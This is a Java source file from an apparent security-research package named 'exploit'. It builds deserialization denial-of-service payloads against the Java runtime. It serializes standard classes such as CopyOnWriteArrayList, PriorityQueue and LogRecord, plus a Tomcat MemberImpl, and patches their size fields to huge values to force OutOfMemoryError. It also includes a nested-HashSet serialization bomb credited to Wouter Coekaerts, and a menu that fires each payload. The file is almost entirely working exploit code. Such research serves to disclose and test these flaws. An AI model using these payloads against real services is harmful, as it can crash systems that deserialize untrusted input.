package com.salesforce.trust.s11n.exploit;

import java.io.IOException;
import java.io.Serializable;
import java.util.Comparator;
import java.util.HashSet;
import java.util.Map;
import java.util.PriorityQueue;
import java.util.Scanner;
import java.util.Set;
import java.util.TreeMap;
import java.util.concurrent.CopyOnWriteArrayList;
import java.util.logging.Level;
import java.util.logging.LogRecord;

import org.apache.catalina.tribes.membership.MemberImpl;

import org.apache.commons.io.HexDump;

import com.salesforce.trust.s11n.Common;

/**
 * 
 * @author Pierre Ernst
 *
 */
public class JreOutOfMemory implements Comparator<Class<?>> {

	private Map<Class<?>, byte[]> classMapping = new TreeMap<>(this);

	public JreOutOfMemory() throws Exception {
		buildPayloads();
	}

	private int getNumberOfPayloads() {
		return classMapping.size();
	}

	private void buildPayloads() throws Exception {
		/*
		@SuppressWarnings("restriction")
		com.sun.istack.internal.localization.Localizable msg = new com.sun.istack.internal.localization.LocalizableMessage(
				"Pierre", "Ernst", new Object[] { "Salesforce" });

		@SuppressWarnings("restriction")
		com.sun.xml.internal.ws.protocol.xml.XMLMessageException xme = new com.sun.xml.internal.ws.protocol.xml.XMLMessageException(
				msg);

		Common.setFieldValue(Throwable.class, "stackTrace", xme, null);
		Common.setFieldValue(Throwable.class, "suppressedExceptions", xme, null);
		byte[] buffer0 = Common.serialize(xme);
		// HexDump.dump(buffer0, 0, System.out, 0);
		buffer0[0x34C] = (byte) 0x7F;
		buffer0[0x34D] = (byte) 0xFF;
		buffer0[0x34E] = (byte) 0xFF;
		buffer0[0x34F] = (byte) 0xFF;
		// HexDump.dump(buffer0, 0, System.out, 0);
		classMapping.put(msg.getClass(), buffer0);
		*/
		
		CopyOnWriteArrayList<?> cowal = new CopyOnWriteArrayList<>();
		byte[] buffer1 = Common.serialize(cowal);
		// HexDump.dump(buffer1, 0, System.out, 0);
		buffer1[0x40] = (byte) 0x7F;
		buffer1[0x41] = (byte) 0xFF;
		buffer1[0x42] = (byte) 0xFF;
		buffer1[0x43] = (byte) 0xFF;
		// HexDump.dump(buffer1, 0, System.out, 0);
		classMapping.put(CopyOnWriteArrayList.class, buffer1);

		PriorityQueue<?> pq = new PriorityQueue<>();
		byte[] buffer3 = Common.serialize(pq);
		// HexDump.dump(buffer3, 0, System.out, 0);
		buffer3[0x59] = (byte) 0x7F;
		buffer3[0x5A] = (byte) 0xFF;
		buffer3[0x5B] = (byte) 0xFF;
		buffer3[0x5C] = (byte) 0xFF;
		// HexDump.dump(buffer3, 0, System.out, 0);
		classMapping.put(PriorityQueue.class, buffer3);

		LogRecord lr = new LogRecord(Level.FINEST, "Pierre Ernst, Salesforce");
		byte[] buffer2 = Common.serialize(lr);
		// HexDump.dump(buffer2, 0, System.out, 0);
		buffer2[buffer2.length - 5] = 0x7F;
		// HexDump.dump(buffer2, 0, System.out, 0);
		classMapping.put(LogRecord.class, buffer2);

		// In this case, we have modified the source file, no need for binary
		// buffer alterations
		MemberImpl mi = new MemberImpl();
		byte[] buffer4 = Common.serialize(mi);
		// HexDump.dump(buffer4, 0, System.out, 0);
		classMapping.put(MemberImpl.class, buffer4);
	}

	private void displayPayloads() {
		int i = 1;
		for (Class<?> cls : classMapping.keySet()) {
			System.out.println(i + ") instance of " + cls.getName() + " (" + classMapping.get(cls).length + " bytes)");
			i++;
		}
		System.out.println(i + ") Quit");
	}

	private Object deserializePayload(int index) throws ClassNotFoundException, IOException {
		return Common.deserialize(getPayload(index));
	}

	public byte[] getPayload(Class<?> cls) {
		return classMapping.get(cls);
	}

	public byte[] getPayload(int index) {
		if ((index < 0) || (index >= classMapping.size())) {
			throw new IllegalArgumentException("index out of bound (" + index + ")");
		}
		int i = 0;
		for (Class<?> cls : classMapping.keySet()) {
			if (i == index) {
				return classMapping.get(cls);
			}
			i++;
		}
		return null;
	}

	@Override
	public int compare(Class<?> cls0, Class<?> cls1) {
		return cls0.getName().compareTo(cls1.getName());
	}

	/**
	 * https://gist.github.com/coekie/a27cc406fc9f3dc7a70d
	 * 
	 * @return
	 */
	public static Serializable getMaliciousSerializable() {
		Set<Object> maliciousSerializable = new HashSet<>();
		Set<Object> s1 = maliciousSerializable;
		Set<Object> s2 = new HashSet<>();
		for (int i = 0; i < 100; i++) {
			Set<Object> t1 = new HashSet<>();
			Set<Object> t2 = new HashSet<>();
			t1.add("by Wouter Coekaerts"); // make it not equal to t2
			s1.add(t1);
			s1.add(t2);
			s2.add(t1);
			s2.add(t2);
			s1 = t1;
			s2 = t2;
		}
		return (Serializable) maliciousSerializable;
	}

	/**
	 * Prompts the user to chose which malicious payload to deserialize and
	 * display an error message when the OutOfMemoryError is thrown
	 */
	public static void main(String... args) {

		Scanner s = new Scanner(System.in);
		try {
			JreOutOfMemory joom = new JreOutOfMemory();
			int choice = -1;

			while (choice != joom.getNumberOfPayloads()) {
				joom.displayPayloads();
				do {
					System.out.print("> ");
					choice = s.nextInt() - 1;
				} while ((choice < 0) || choice > joom.getNumberOfPayloads());

				if (choice != joom.getNumberOfPayloads()) {
					try {
						joom.deserializePayload(choice);
					} catch (OutOfMemoryError oom) {
						System.out.println("\t" + oom.getMessage());
						System.out.println("\t" + oom.getStackTrace()[0]);
						System.out.println();
					}
				}
			}

		} catch (Exception ex) {
			ex.printStackTrace(System.err);
		} finally {
			s.close();
		}
	}
}
